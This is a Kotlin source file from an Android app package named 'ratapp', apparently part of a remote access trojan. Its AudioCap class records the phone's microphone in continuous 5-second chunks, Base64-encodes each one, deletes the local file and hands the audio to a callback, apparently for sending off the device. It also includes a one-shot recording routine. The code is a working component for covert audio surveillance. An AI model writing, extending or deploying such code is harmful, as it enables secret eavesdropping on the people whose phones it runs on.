package com.ratio.ratapp

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import java.io.File
import java.io.FileInputStream

class AudioCap(private val ctx: Context) {

    private var recorder: MediaRecorder? = null
    private var streaming = false
    private var seq = 0L
    private var onChunk: ((String, Long) -> Unit)? = null
    private var chunkFile: File? = null

    private fun newRecorder(file: File): MediaRecorder {
        val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx)
        else @Suppress("DEPRECATION") MediaRecorder()
        r.setAudioSource(MediaRecorder.AudioSource.MIC)
        r.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        r.setAudioChannels(1)
        r.setAudioSamplingRate(16000)
        r.setAudioEncodingBitRate(32000)
        r.setOutputFile(file.absolutePath)
        r.prepare()
        return r
    }

    fun startStream(onChunk: (String, Long) -> Unit) {
        if (streaming) return
        streaming = true
        this.onChunk = onChunk
        nextChunk()
    }

    private fun nextChunk() {
        if (!streaming) return
        val f = File(ctx.cacheDir, "aud_${seq}.aac")
        chunkFile = f
        recorder = try { newRecorder(f) } catch (t: Throwable) { streaming = false; return }
        recorder?.start()
        Handler(Looper.getMainLooper()).postDelayed({
            try { recorder?.stop() } catch (_: Throwable) {}
            try { recorder?.release() } catch (_: Throwable) {}
            recorder = null
            val bytes = f.readBytes()
            f.delete()
            if (bytes.isNotEmpty()) {
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                onChunk?.invoke(b64, seq)
            }
            seq++
            if (streaming) nextChunk()
        }, 5000)
    }

    fun stop() {
        streaming = false
        try { recorder?.stop() } catch (_: Throwable) {}
        try { recorder?.release() } catch (_: Throwable) {}
        recorder = null
    }

    fun recordOnce(durationMs: Long, cb: (String) -> Unit) {
        val f = File(ctx.cacheDir, "aud_once.aac")
        val r = try { newRecorder(f) } catch (t: Throwable) { cb(""); return }
        r.start()
        Handler(Looper.getMainLooper()).postDelayed({
            try { r.stop() } catch (_: Throwable) {}
            try { r.release() } catch (_: Throwable) {}
            val bytes = f.readBytes()
            f.delete()
            cb(Base64.encodeToString(bytes, Base64.NO_WRAP))
        }, durationMs)
    }
}